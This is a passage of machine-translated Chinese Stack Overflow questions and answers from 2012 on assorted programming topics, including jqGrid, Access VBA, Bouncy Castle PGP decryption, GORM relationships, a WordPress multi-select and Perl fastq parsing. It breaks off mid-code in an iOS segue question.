![架构的 XCode 构建设置](../Images/e8f134b14c7e9c25636661a843c1e269.png)

也去你的**Info.plist**。**您可能会找到一个名为Required device capabilities**的数组。如果它包含字符串**armv7**，则删除该项目。

![所需设备功能的 XCode Info.plist 设置](../Images/6db8e4c00b95d41288d6f5d71fd6bb9e.png)

从 XCode 4.3.2 开始需要这些更改。XCode 和 iOS SDK 的未来版本可能会添加其他默认项目设置，这些设置必须回滚才能在旧设备上运行。

# jquery - 从 jqGrid 中的数据库加载搜索模板过滤器

> ID：10305794
> 
> 赞同：0
> 
> 时间：2012-04-24T20:50:30.637
> 
> 标签：jquery, jqgrid

我正在尝试使用数据库存储和加载搜索模板。这样做时，我无法更改 tmplLabel、tmplNames、tmplFilters 的值。我正在调用 loadTemplates() 函数，该函数转到服务器以获取数据并存储在 3 个变量中。此函数在 loadComplete() 处被调用。请让我知道如何重置模板的值。我说的是[http://www.trirand.com/blog/jqgrid/jqgrid.html](http://www.trirand.com/blog/jqgrid/jqgrid.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:54:10.237

搜索模板是一个不常用的有趣功能。要使用它，应该使用`tmplNames`和`tmplFilters`（可选`tmplLabel`）这是搜索模块的[参数](http://www.trirand.com/jqgridwiki/doku.php?id=wiki:singe_searching#options)。如果您`recreateFilter: true`另外使用选项很重要。所以你可以设置选项

```
var mySearchOptions = {
        // it's just some options which you use
        multipleSearch: true,
        multipleGroup: true,
        recreateFilter: true,
        closeOnEscape: true,
        closeAfterSearch: true,
        overlay: 0
    },
    $grid = $("#grid");

$grid.jqGrid({
    // ... your jqGrid options
    loadComplete: function (data) {
        // you should modify the next line correspond to the place of
        // tmplNames and tmplFilters in the server response
        if (data.tmplNames && data.tmplFilters) {
            mySearchOptions.tmplNames = data.tmplNames;
            mySearchOptions.tmplFilters = data.tmplFilters;
        }
    }
});
$grid.jqGrid('navGrid', {/*navGrid option*/}, {/*Edit options*/}, {/*Add options*/},
    {/*Del options*/},
    mySearchOptions); 
```

我想你已经有正确的代码，但你不使用`recreateFilter: true`选项。因此，将显示先前打开的搜索对话框，而不是使用当前选项重新创建对话框。

PS 我建议您另外刷新 jqGrid 4.3.2 的源代码（参见[答案](https://stackoverflow.com/a/10302130/315935)）。您将拥有更好的键盘支持，可以在搜索对话框中使用`searchOnEnter`和`closeOnEscape`选项、`afterChange`回调和自定义控件（参见[答案](https://stackoverflow.com/a/10284605/315935)）。

# ms-access - 在 Access 2007 中实现多对多、子表单、复选框

> ID：10305796
> 
> 赞同：1
> 
> 时间：2012-04-24T20:50:37.283
> 
> 标签：ms-access, vba

人Person_Pet Pet

我需要制作一个数据输入表格。假设我们有一个名为 Person 的表，其中包含适当的字段。在我的表单上，我需要允许用户从（一个或多个）复选框中选择代表他们可能拥有的所有可能的宠物（固定的项目列表：狗、薮猫、美洲驼、鹿角羚、鸸鹋、龙、蜘蛛......） .

对于表单，需要有一个复选框来代表每个可能的选择。如果该人确实有一只宠物狗，那么该复选框必须为真，如果他们没有狗，则该复选框必须为假（我想我说的是显而易见的，因为我试图将其作为子表单执行“多对多”和显示“假”值的东西。他们可以选择不止一个。

最终我需要制作一个新表格或重新使用数据输入表格进行修改等。

这是一个子窗体吗？我有一个 Person 表、Pet 表、Person_Pet（id/joining）表。我正在尝试使用 VBA 完成这一切，但我认为我选择了艰难的方式，但是，现在改变方向还为时不晚。

编辑：如果我从这个开始呢？这将导致给我所有可能宠物的列表，如果 p.personid 为空，则不选中该复选框。如果它不为空，则对其进行检查。这可能吗？（请原谅格式，访问 sql 编写器显然不知道选项卡是什么，请原谅 sytanx 错误，因为我必须快速查找和替换表名）

```
select pet.*, p.personid
from pet pet 
left outer join
(select pi.petID, pi.personid
from    person,
        pet_person pi,
        pet 
where   person.id = pi.personID and
        pet.id = pi.petID) as p
on p.petID = pet.id 
```

编辑：

好的。那里有一个巨大的答案。我也解决了。我还没有看过你的答案，但我会稍微看一下。这是我的答案...（没有子表单，只在主表单上，“人”表单）

1.  制作复选框......并将它们命名为chk1，chk2，chk3......等等。
2.  确保它们对应于我的 lil pet 表中的适当字段....所以 dog = chk1, serval = chk2 ... stuff
3.  执行此 vba（并从 Form_Current() 调用函数并将其传递给 me.id）：

Function update_checkboxes(issueID As Variant) Dim query As String Dim rs As DAO.Recordset Dim db As Database Set db = CurrentDb Dim a As String

```
If Not IsNull(issueID) Then
    query = "SELECT iif(joined.issueid is null, 0, 1) as binval, payer.* " & _
            "FROM payer AS payer LEFT JOIN (select ri.issueid, ri.payerid " & _
                    "from  issue i, payer r, payer_issue ri " & _
                    "where i.id = ri.issueid and r.id = ri.payerid and ri.issueid = " & issueID & _
                    ")  AS joined ON joined.payerid = payer.id;"
Else
    query = "select 0 as binval, payer.* from payer"
End If

Set rs = db.OpenRecordset(query)
rs.MoveFirst

Do While Not rs.EOF
    s = rs.Fields("CorrespondingChkboxNumber")
    Me.Controls("chk" & s).Value = rs.Fields("binval")
    rs.MoveNext
Loop

rs.Close
End Function 
```

是的。复制粘贴代码格式stackoverflow的东西讨厌我。对不起。嗯。问题=人，付款人=宠物。我知道相应的复选框的东西不是主意，我将不得不搜索/检查一个字符串字段，但这显示了我认为我最终可能会使用的概念，除非............ …………

**后续问题：每次更改记录时运行这些 vba 查询是否存在严重的时间限制问题/后果/总结？**

顺便提一句。供参考。用选定的答案展示可能的答案的愿望是因为有时事物不是什么与事物是什么同样重要。一些地区/县/市不允许比特犬。整个加利福尼亚州显然取缔了雪貂。我确实有一只比特犬。我没有雪貂。我们都只希望我们有宠物龙可以训练。所有这些都在某些地区的禁止宠物清单上，所以......这两个东西都需要展示。一个列表框可以做到这一点，但我觉得它看起来有点尴尬。通过明显列出我所有可能的宠物，我知道哪些会升旗。虽然最后只有我所拥有的才是真正重要的......仍然。但显然我并没有为人和宠物以及他们可以居住的地方制作一个可爱的小访问数据库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:53:17.543

使用子表单。疯狂的多个复选框边框:)

你需要一张桌子：

```
PersonID
PetID 
```

PetID 将是一个组合框，其中包含列出可能宠物的行源。PersonID 将是链接子字段和主字段。

您不需要任何代码来执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-25T15:59:21.057

使用 VBA，您可以使用以下代码。有两种选择：

1.  使用“本机”访问列表框：这会将您的选择显示为常规列表框中的突出显示行

    在列表框属性/所有工作表中选择 multiselect=1 (Single)
    并修改以下代码 -> 取消注释行并注释上面的行

2.  使用 MSForms.Listbox（在 Formcreation 中选择 activeX 插入）
    ，您可以获得所需的复选框。

    选择了 Multiselect:multi 和 ListStyle:option。这里没有点击事件，所以我选择了退出事件。到目前为止我还没有遇到任何问题，但是有条不紊地点击事件会更好。

这是代码：

```
Option Compare Database
Option Explicit

Dim pPetListBox As MSForms.ListBox

Private Sub FillPetListbox() 
  pPetListBox.Clear
  Dim rst As DAO.Recordset
  Set rst = CurrentDb.OpenRecordset("select * from pet order by id")
  While Not rst.EOF
    pPetListBox.AddItem rst!ID
    pPetListBox.List(pPetListBox.ListCount - 1, 1) = rst!petname
    rst.MoveNext
  Wend
  rst.Close
End Sub

Private Sub Form_Current()
  Dim rst As DAO.Recordset
  Dim indx As Long
  Set rst = CurrentDb.OpenRecordset("select * from person_pet where personid=" & Me.ID)
  For indx = 0 To pPetListBox.ListCount - 1
    rst.FindFirst "petID = " & pPetListBox.Column(0, indx)
'    rst.FindFirst "petID = " & petList.ItemData(indx)
    pPetListBox.Selected(indx) = Not rst.NoMatch
  Next
  rst.Close
End Sub

Private Sub UpdateLinkTable()
  Dim rst As DAO.Recordset
  Dim indx As Long
  Set rst = CurrentDb.OpenRecordset("select * from person_pet where personid=" & Me.ID)
  indx = pPetListBox.ListIndex
  rst.FindFirst "petID = " & pPetListBox.List(indx, 0)
  'rst.FindFirst "petID = " & petList.ItemData(indx)
  If (pPetListBox.Selected(indx) And rst.NoMatch) Then
    rst.AddNew
    rst!personID = Me.ID
    rst!petID = pPetListBox.Column(0, indx)
    rst.Update
  Else
    If ((Not pPetListBox.Selected(indx)) And (Not rst.NoMatch)) Then
      rst.Delete
    End If
  End If
  rst.Close
End Sub

Private Sub Form_Load()
  Set pPetListBox = Me.msfPetListBox.Object
  FillPetListbox
End Sub

Private Sub msfPetListBox_Exit(Cancel As Integer)
'Private Sub petList_Click()
  UpdateLinkTable
End Sub 
```

如果您使用本机访问列表框，则不必以编程方式加载列表框内容 (FillPetListBox)。相反，您可以将 rowsource-property 设置为 pet-table。我认为甚至可以将 MSForms.listbox 绑定到该表 - 但我还没有尝试过（还）。

# sql - 如何让 Eclipse 在 Mac 上的 SQL Windows 中默认为正确的字体大小

> ID：10305803
> 
> 赞同：0
> 
> 时间：2012-04-24T20:51:10.660
> 
> 标签：sql, eclipse, macos, font-size

我在 Mac OS 10.7（和 10.6）上使用 Eclipse IndigoI。每当我打开一个 SQL 窗口（使用 SQL Explorer 连接到 SQL DB，或者只是打开一个 foo.sql 文件）时，它都会以非常小的字体显示文本。要让它以正确的字体显示，我必须选择该窗口的首选项，常规 -> 编辑器 -> 文本编辑器，单击“颜色和字体”，选择“文本字体”，然后单击“编辑”按钮，然后更改字体（因为它忽略了当前设置，并且保持不变没有任何效果）。

这变得相当乏味，尤其是。因为我必须为我打开的每个 SQL 文本文件执行此操作。

有人知道这个错误的修复吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-11T15:41:20.073

刚刚在 Juno 上发生在我身上，但不是更小的文本，而是更大的文本字体。我修复了它在**General -> Appearance -> Colors and Fonts -> Basic ->**中更改它并选择了**文本编辑器块选择**字体和**文本字体**并更改了字体大小。

# vb.net - 带有 VB.Net 的充气城堡 OpenPGP

> ID：10305810
> 
> 赞同：1
> 
> 时间：2012-04-24T20:51:24.353
> 
> 标签：vb.net, bouncycastle, openpgp

我主要是为其他需要它的人发布这个，因为互联网上似乎非常缺乏这方面的资源。我确实找到的样本似乎充其量只是蹒跚而行，对我来说从来没有用过。如果你看到或发现这门课有什么问题，我很想知道。请注意，该类针对我的特定实现稍作修改，但在 Bouncy Castle .Net 源代码的 1.7 版中应该可以正常工作。

```
Imports System.IO
Imports Org.BouncyCastle.Bcpg.OpenPgp

Public Class PgpDecrypt
    Private _mPublicKeyPath As String = "C:\MyPgpKeys\MyKey - Public.asc"
    Private _mPrivateKeyPath As String = "C:\MyPgpKeys\MyKey - Private.asc"
    Private _mPassPhrase As String = "<passwoid>"

    Public Function Decrypt(ByVal srcPath As String, ByVal dstPath As String) As Boolean
        Dim stEnc As Stream = PgpUtilities.GetDecoderStream(File.OpenRead(srcPath))
        Dim pof As New PgpObjectFactory(stEnc)
        Dim pked As PgpPublicKeyEncryptedData = Nothing

        Dim keyPrivate As PgpPrivateKey = Nothing
        For Each pked In GetEncryptedDataList(pof).GetEncryptedDataObjects
            keyPrivate = ReadPrivateKey(pked.KeyId)
            If Not keyPrivate Is Nothing Then Exit For
        Next
        If keyPrivate Is Nothing Then Return False

        Dim stDec As Stream = pked.GetDataStream(keyPrivate)
        pof = New PgpObjectFactory(stDec)
        Dim o As PgpObject = pof.NextPgpObject
        If TypeOf o Is PgpCompressedData Then
            pof = New PgpObjectFactory(DirectCast(o, PgpCompressedData).GetDataStream)
            o = pof.NextPgpObject
        End If
        While Not TypeOf o Is PgpLiteralData
            o = pof.NextPgpObject
            If o Is Nothing Then Return False
        End While
        Dim ld As PgpLiteralData = DirectCast(o, PgpLiteralData)
        Dim stOut As Stream = File.Create(dstPath)
        Dim stUnc As Stream = ld.GetInputStream
        Org.BouncyCastle.OpenPgp.Utilities.IO.Streams.PipeAll(stUnc, stOut)
        stOut.Close()

        Return True
    End Function

    Private Function GetEncryptedDataList(ByVal pof As PgpObjectFactory) As PgpEncryptedDataList
        Dim o As PgpObject = Nothing
        While Not TypeOf o Is PgpEncryptedDataList
            o = pof.NextPgpObject
            If o Is Nothing Then Return Nothing
        End While
        Return DirectCast(o, PgpEncryptedDataList)
    End Function

    Private Function ReadPublicKey(Optional ByVal useEmbedded As Boolean = False) As PgpPublicKey
        If useEmbedded Then
            Using st As Stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(GetAssemblyName() & ".MyKey - Public.asc")
                Dim bundle As PgpSecretKeyRingBundle = New PgpSecretKeyRingBundle(PgpUtilities.GetDecoderStream(st))
                For Each ring As PgpPublicKeyRing In bundle.GetKeyRings
                    For Each key As PgpPublicKey In ring.GetPublicKeys
                        If key.IsEncryptionKey Then Return key
                    Next
                Next
            End Using
        Else
            Using st As Stream = File.OpenRead(_mPublicKeyPath)
                Dim bundle As PgpPublicKeyRingBundle = New PgpPublicKeyRingBundle(PgpUtilities.GetDecoderStream(st))
                For Each ring As PgpPublicKeyRing In bundle.GetKeyRings
                    For Each key As PgpPublicKey In ring.GetPublicKeys
                        If key.IsEncryptionKey Then Return key
                    Next
                Next
            End Using
        End If

        Return Nothing
    End Function

    Private Function ReadSecretKey(Optional ByVal useEmbedded As Boolean = False) As PgpSecretKey
        If useEmbedded Then
            Using st As Stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(GetAssemblyName() & ".MyKey - Private.asc")
                Dim bundle As PgpSecretKeyRingBundle = New PgpSecretKeyRingBundle(PgpUtilities.GetDecoderStream(st))
                For Each ring As PgpSecretKeyRing In bundle.GetKeyRings
                    For Each key As PgpSecretKey In ring.GetSecretKeys
                        If key.IsSigningKey Then Return key
                    Next
                Next
            End Using
        Else
            Using st As Stream = File.OpenRead(_mPrivateKeyPath)
                Dim bundle As PgpSecretKeyRingBundle = New PgpSecretKeyRingBundle(PgpUtilities.GetDecoderStream(st))
                For Each ring As PgpSecretKeyRing In bundle.GetKeyRings
                    For Each key As PgpSecretKey In ring.GetSecretKeys
                        If key.IsSigningKey Then Return key
                    Next
                Next
            End Using
        End If

        Return Nothing
    End Function

    Private Function ReadPrivateKey(ByVal keyId As Long, Optional ByVal useEmbedded As Boolean = False) As PgpPrivateKey
        If useEmbedded Then
            Using st As Stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(GetAssemblyName() & ".MyKey - Private.asc")
                Dim bundle As PgpSecretKeyRingBundle = New PgpSecretKeyRingBundle(PgpUtilities.GetDecoderStream(st))
                Dim key As PgpSecretKey = bundle.GetSecretKey(keyId)
                If key Is Nothing Then Return Nothing
                Return key.ExtractPrivateKey(_mPassPhrase)
            End Using
        Else
            Using st As Stream = File.OpenRead(_mPrivateKeyPath)
                Dim bundle As PgpSecretKeyRingBundle = New PgpSecretKeyRingBundle(PgpUtilities.GetDecoderStream(st))
                Dim key As PgpSecretKey = bundle.GetSecretKey(keyId)
                If key Is Nothing Then Return Nothing
                Return key.ExtractPrivateKey(_mPassPhrase)
            End Using
        End If
    End Function

    Private Function GetAssemblyName() As String
        Dim names() As String = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceNames
        If names.Length > 0 Then
            Return names(0).Split(".").First
        Else
            Return String.Empty
        End If
    End Function
End Class 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T15:02:23.217

惊人的！非常感谢您发布这个 - 它几乎可以开箱即用。需要将其中一项更改`Org.BouncyCastle.OpenPgp.Utilities.IO.Streams.PipeAll(stUnc, stOut)`替换为`Org.BouncyCastle.Utilities.IO.Streams.PipeAll(stUnc, stOut)`.

# eclipse - Eclipse Indigo 不再能够复制粘贴文件

> ID：10305811
> 
> 赞同：2
> 
> 时间：2012-04-24T20:51:31.057
> 
> 标签：eclipse

在 Windows 7 上运行 Eclipse Indigo Service Release 2。（Java EE 版本）

在包/项目资源管理器中，右键单击文件并单击“复制”，然后右键单击目标文件夹并单击“粘贴”会触发创建仅包含文件名称的代码片段。

所以，由于某种原因，它不再复制整个文件......只是他们的名字......不知道为什么，我似乎无法弄清楚为什么这会停止工作。（我仍然可以从 Windows 资源管理器中粘贴文件……所以这也让我相信副本有问题）。

我在研究此问题时遇到的其他复制粘贴问题似乎与编辑器相关，但希望有人遇到此文件问题并知道如何解决它。:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-17T19:20:44.190

某些应用程序，如 Skype 点击通话，会干扰 Eclipse 中的正常复制粘贴。如果您已安装此应用程序或其他最近安装的应用程序，请尝试卸载它们。

我有一个合作伙伴最近遇到了同样的问题并以这种方式解决了它。

# c# - 如何找到暴露给配置文件的属性？

> ID：10305813
> 
> 赞同：0
> 
> 时间：2012-04-24T20:51:36.903
> 
> 标签：c#, .net, web-config

我想我不了解配置如何工作的基础知识。让我们以[SimpleMailWebEventProvider 类](http://msdn.microsoft.com/en-us/library/system.web.management.simplemailwebeventprovider%28v=vs.110%29.aspx)为例。仅通过查看 MSDN 文档，我将如何找出 web config 中可配置的内容？在示例中，有许多可配置的属性，例如“to”、“subject prefix”。这些属性不是公开的，除了示例之外，没有关于可以在 web.config 中设置什么的信息。也没有智能。我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T00:12:15.543

MSDN 底部有一个指向[HealthMonitoring Section](http://msdn.microsoft.com/en-us/library/system.web.configuration.healthmonitoringsection%28v=vs.110%29.aspx)的链接。通常，如果这有很好的记录，此页面将包含您需要的内容，或者至少链接到您需要的内容。不幸的是，您似乎遇到了一些糟糕的文档。

我能够在此页面上找到更多详细信息：http: [//msdn.microsoft.com/en-us/library/ff650305.aspx#paght000011_moreinfo](http://msdn.microsoft.com/en-us/library/ff650305.aspx#paght000011_moreinfo)。这似乎是 MSDN 上该元素的文档范围。

# c# - 确定 Request.Form 中的控件类型

> ID：10305824
> 
> 赞同：2
> 
> 时间：2012-04-24T20:52:28.537
> 
> 标签：c#, asp.net, asp.net-mvc-2

您如何确定 中的控制类型`Request.Form`？

```
 foreach (string x in Request.Form.Keys)
 {                                
    if (Request.Form[x] == null || Request.Form[x].ToString() == "")
    {.... 
```

我想知道每个循环的控制类型是什么。

它是文本框、列表框、隐藏字段等...

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:01:22.570

偶尔手动使用 Request 集合而不是强类型控制对象很有用。但是，几乎在任何情况下，遍历所有控件都可能是一个坏主意。

您可以使用 Request 集合中的键执行[递归。](http://sharpertutorials.com/recursive-findcontrol/) `FindControl()`如果`FindControl`不返回 null，请检查控件的类型。

请注意，提交的密钥与控件的实际 ID 不同。它通常看起来像：

```
<input type="text" name="foo$bar$txtFirstName" id="foo_bar_txtFirstName" /> 
```

“name”是请求集合中的实际键，但“id”是控件的 ID。这需要进一步的映射步骤。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:01:47.317

这是不可能的。浏览器不提交此信息。HTTP 标准不包含本质上传输此信息的方法。

# grails - grails 1.3.7 - GORM 对可空反射多对一关系的误解（可能的错误？）

> ID：10305825
> 
> 赞同：1
> 
> 时间：2012-04-24T20:52:37.443
> 
> 标签：grails, grails-orm

我遇到了一些乍一看似乎是 Gorm 中的错误（grails 1.3.7）。我想我会在解决 jira 问题之前在这里发布问题，以防我弄错了。

这是问题：

我有一个域类，它引用同一个类的父对象，也可以有一个指向别名的指针，也属于同一个域类。

这是域类：

```
class Mydomain {
    String name
    Mydomain alias
    Mydomain parent
    Mydomain foo

    static constraints = {
        parent(nullable: true)
        alias(nullable: true)
        foo(nullable: true)
    }
} 
```

如果我执行以下脚本：

```
Mydomain.list()*.delete()
def one=new Mydomain(name:'one').save()
new Mydomain(name:'two', parent:one).save()

Mydomain.list().each{
    println it.name
    println "parent:${it.parent?.name}"
    println "alias:${it.alias?.name}"
    println "foo:${it.foo?.name}"
    println "============================"
} 
```

我得到以下结果：

```
one
parent:null
alias:two
foo:null
============================
two
parent:one
alias:null
foo:null
============================ 
```

这意味着当我设置*two.parent=one*时，gorm 会设置*one.alias=two*。

*我猜 gorm 这样做是因为它推断出one*和*two*之间存在双向关系，然后将 object *one的 Mydomain 类的第一个属性设置为**two*的引用。

我可以看到这种行为适用于 Author 和 Book 之间的双向关系（假设作者当然只写一本书），但在我的情况下这是危险的，因为 gorm 会覆盖与此无关的关系.

所以我的问题是，我如何告诉 GORM 将其视为单向可为空的关系？

感谢您的任何想法

**更新：商业案例**

这是我试图建模的商业案例。一个公司有一个名字，可以有子公司、仓库、当地办事处等。这是在父关系的帮助下建模的，有效地创建了公司树：

```
class Company {
    String name
    Company parent
} 
```

现在，这种组织结构的表示对于每个人来说都不一样，有些人可能不在乎办公室级别，或者在小组级别。这就是为什么公司可以在并行表示中使用别名。它仍然是同一家公司，可以有不同的名称，但您希望能够通过别名关系在这些平行树组织之间导航。

```
class Company {
    String name
    Company parent
    Company alias
} 
```

所以是的，与 self 有多种关系，但它们有非常不同的含义，我知道 GORM 使用最常见的简单案例作为默认值，但我真的在 DSL 中尽我所能来指示 GORM 做正确的事事情，但没有成功。

执行此操作的常规方法是使用 mappedBy 指令添加双向一对多关系：

```
class Company {
    String name
    Company alias

    static belongsTo=[parent:Company]
    static hasMany=[children:Company]
    static mappedBy=[children:'parent']
} 
```

但是在许多 GORM 文章中，由于严重的性能问题，不鼓励使用这种成语。这就是为什么我想要一个单向的关系

```
Company ---(parent)---> Company 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-25T09:17:45.620

这里不应该使用适当的约束吗？只是想知道，因为我做了以下更改，现在输出不同了

```
class Mydomain {
    String name
    Mydomain alias
    Mydomain foo

    static belongsTo = [parent:Mydomain]

    static constraints = {
        parent(nullable: true)
        alias(nullable: true)
        foo(nullable:true)
    }
} 
```

测试输出（也许这是你所期望的）

```
one
null
null
============================
two
null
null
============================ 
```

如果您可以提供有关您的域场景的更多详细信息，我们可以对此进行扩展。否则，我认为 GORM 会自动设置基数，因为没有指定约束。

**免责声明：我使用的是 Grails 2.0.1**

**更新（26/04/12）：** 考虑到业务案例，如下所示的改造对您有用吗？

```
class Mydomain {
    String name

    static belongsTo = [parent:Mydomain]

    static constraints = {
        parent(nullable: true)
    }
}

class MydomainAlias {

    Mydomain me 
    Mydomain alias

    static constraints = {
        me (unique: 'alias')
    }
} 
```

本质上，这将别名隔离到不同的表。Grails 会自动为您生成外键依赖项。示例模式导出如下所示

```
create table mydomain (id bigint not null auto_increment, version bigint not null, name varchar(255) not null, parent_id bigint, primary key (id));
create table mydomain_alias (id bigint not null auto_increment, version bigint not null, alias_id bigint not null, me_id bigint not null, primary key (id), unique (alias_id, me_id));
alter table mydomain add index FKECA5F170DF99DE64 (parent_id), add constraint FKECA5F170DF99DE64 foreign key (parent_id) references mydomain (id);
alter table mydomain_alias add index FKA70D16C16A628AB6 (me_id), add constraint FKA70D16C16A628AB6 foreign key (me_id) references mydomain (id);
alter table mydomain_alias add index FKA70D16C1CA5FA6FE (alias_id), add constraint FKA70D16C1CA5FA6FE foreign key (alias_id) references mydomain (id); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T12:21:04.470

发布 JIRA 问题后 [http://jira.grails.org/browse/GRAILS-9062?focusedCommentId=70641#comment-70641](http://jira.grails.org/browse/GRAILS-9062?focusedCommentId=70641#comment-70641)

以及邮件列表中的一些交流，

[http://markmail.org/message/xcmcclr2lv7ecrbn](http://markmail.org/message/xcmcclr2lv7ecrbn)

该解决方案由 Graeme Rocher 提出。

只需添加以下 mappedBy 闭包

```
static mappedBy = [
    parent: 'null',
    alias:'null',
    foo:'null'
] 
```

这将指示 GORM 不要假设需要双向关系。

感谢大家的专家帮助！

# php - 多选 - 选择 jQuery

> ID：10305836
> 
> 赞同：2
> 
> 时间：2012-04-24T20:53:27.277
> 
> 标签：php, wordpress, forms, jquery-chosen

我正在使用 Harvest Chosen jQuery 插件成功地在 Wordpress 网站上创建带有提交按钮的下拉单选列表。这被连接起来以显示来自给定分类的所有术语，并允许用户选择一个术语，然后按下提交按钮以加载与所选术语相关的相应页面。

我现在正试图让插件与分类中的多个术语一起使用。我有选择工作，并且在前端用户可以选择多个术语，但我不知道如何提交多个选择。

我知道我的代码缺少一些东西，但我不知道需要修改什么以允许选择多个术语。

这是我到目前为止所拥有的：

```
<form action="<?php bloginfo('url'); ?>">
<div>
<?php
function get_terms_dropdown($taxonomies, $args){
    $myterms = get_terms($taxonomies, $args);
    $output ="<select name='topics' class='chosen' style='width:500px' multiple='true'>";
    foreach($myterms as $term){
        $root_url = get_bloginfo('url');
        $term_taxonomy = $term->taxonomy;
        $term_slug = $term->slug;
        $term_name = $term->name;
        $link = $term_slug;
        $output .="<option value='".$link."'>".$term_name."</option>";

}
    $output .="</select>";
return $output;
}

$taxonomies = array('topics');
$args = array();
echo get_terms_dropdown($taxonomies, $args);

?>
<div><input type="submit" value="Filter" /></div>
</div>
</form> 
```

通常，对于多项选择，“AND”查询的 URL 结构如下所示：

```
domain.com/?topics=topic1+topic2+topic3 
```

或以下用于“或”查询：

```
domain.com/?topics=topic1,topic2,topic3 
```

获得这些选项中的任何一个现在都可以使用（我最终打算为 AND/OR 搜索添加一个选项）

任何帮助或指向正确方向以使其正常工作都会很棒。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:05:07.077

当您提交表单时，您可以使用 JavaScript 构建 URL 并使用以下内容更改页面：

```
$('form').submit( function() {
    var selectArray = $('select').val();
    var newURL = "http://domain.com/?topics=";
    for (var i = 0; i < selectArray.length; i++) {
        if ( 1 != 0 ) {
            newURL += "+";
        }
        newURL += selectArray[i];
    }
    window.location = newURL;
}); 
```

细分：`$('form').submit( function() { [...] });`提交表单时触发。您可能希望使用 表单特有的类`$('form.yourClass')`或 ID来限定它。`$('form#yourID')`

`$('select').val()`将返回一个选择元素的选定值的数组。`$('select.yourClass')`它应该以与带有 class或 ID的表单相同的方式进行限定`$('select#yourID')`。JavaScript 遍历数组并将每个值附加到根 URL 的`http://domain.com/?topics=`每个`+`值之间。完成后，用户将被重定向到新 URL。

# performance - 提高fastq的解析速度

> ID：10305841
> 
> 赞同：1
> 
> 时间：2012-04-24T20:53:55.120
> 
> 标签：performance, perl, parsing, fastq

@solved 使用相同代码的 C# 速度是原来的两倍

我正在用 perl 解析一个 phred33 fastq 文件，这需要相当长的时间（大约 15 分钟）。fastq 文件大约 3 gigs。有什么合理的方法可以加快速度吗？

```
$file=shift;
open(FILE,$file);
open(FILEFA,">".$file.".fa");
open(FILEQA,">".$file.".qual");
while($line=<FILE>)
{
    chomp($line);
    if($line=~m/^@/)
    {

    $header=$line;
    $header =~ s/@/>/g;
    $seq=<FILE>;
    chomp($seq);
    $nothing=<FILE>;
    $nothing="";
    $fastq=<FILE>;

    print FILEFA $header."\n";
    print FILEFA $seq."\n";
    $seq="";
    print FILEQA $header."\n";

        @elm=split("",$fastq);
        $i=0;
        while(defined($elm[$i]))
        {
            $Q = ord($elm[$i]) - 33;
            if($Q!="-23")
            {
            print FILEQA $Q." ";
            }
            $i=$i+1;
        }
        print FILEQA "\n";
    }
}
print $file.".fa\n";
print $file.".qual\n"; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:55:09.080

这里几乎没有使用 CPU。它是 IO 绑定的，所以主要是读取 3GB 的时间。可以进行微优化（和其他清理）。

首先，始终使用`use strict; use warnings;`.

主要代码是

```
my @elm = split(//, $fastq);
my $i=0;
while(defined($elm[$i])) {
    my $Q = ord($elm[$i]) - 33;
    if($Q!="-23") {
        print FILEQA $Q." ";
    }
    $i=$i+1;
} 
```

的目的`if($Q!="-23")`是检查字符是否是换行符，如果你这样做了，你就不必这样做了`chomp($fastq);`。（周围的引号是`-23`什么？！）

```
chomp($fastq);
my @elm = split(//, $fastq);
my $i=0;
while(defined($elm[$i])) {
    my $Q = ord($elm[$i]) - 33;
    print FILEQA $Q." ";
    $i=$i+1;
}
print FILEQA "\n"; 
```

使用`while`循环只会使事情复杂化。当迭代次数已知时，使用 for 循环。

```
chomp($fastq);
for (split(//, $fastq)) {
    print FILEQA (ord($_)-33)." ";
}
print FILEQA "\n"; 
```

把它翻过来可能会有所帮助。

```
chomp($fastq);
print FILEQA join(' ', map ord($_)-33, split //, $fastq), "\n"; 
```

再想一想，里面还不够:)

```
$fastq =~ s/(.)/(ord($1)-33) . " "/eg;
print FILEQA $fastq; 
```

但是我们预先计算的翻译是什么？这样我们就不必`/e`重复调用 sub（代码）了。

```
my %map = map { chr($_) => ($_-33)." " } 0x00..0xFF;

$fastq =~ s/(.)/$map{$1}/g;
print FILEQA $fastq; 
```

* * *

经过一番清理后，我们得到：

```
use strict;
use warnings;

my %map = map { chr($_) => ($_-33)." " } 0x00..0xFF;

my $file = shift;

my $fa_file   = "$file.fa";
my $qual_file = "$file.qual";

open(my $FILE,   '<', $file     ) or die $!;
open(my $FILEFA, '>', $fa_file  ) or die $!;
open(my $FILEQA, '>', $qual_file) or die $!;

while (my $header = <$FILE>) {
    next if $header !~ /^@/;

    my $seq = <$FILE>;
    <$FILE>;
    my $fastq = <$FILE>;

    $header =~ s/@/>/g;
    $fastq =~ s/(.)/$map{$1}/g;

    print $FILEFA $header;
    print $FILEFA $seq;

    print $FILEQA $header;
    print $FILEQA $fastq;
}

print "$fa_file\n";
print "$qual_file\n"; 
```

# ios - performSegueWithIdentifier 根本不工作

> ID：10305842
> 
> 赞同：1
> 
> 时间：2012-04-24T20:53:56.177
> 
> 标签：ios, xcode, uitableview, identifier, segue

嗨，我正在尝试根据用户选择的内容推送到不同的视图。我有一个表格视图，其中有 4 个其他视图控制器通过情节提要中的推送序列链接到它。所有 Segue 都直接链接到 TableView 视图控制器。根据选择的单元格，它会加载相应的视图。这是我正在使用的代码：

```
-(void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath{

    NSDictionary *dictionary = [_articles objectAtIndex:indexPath.row];
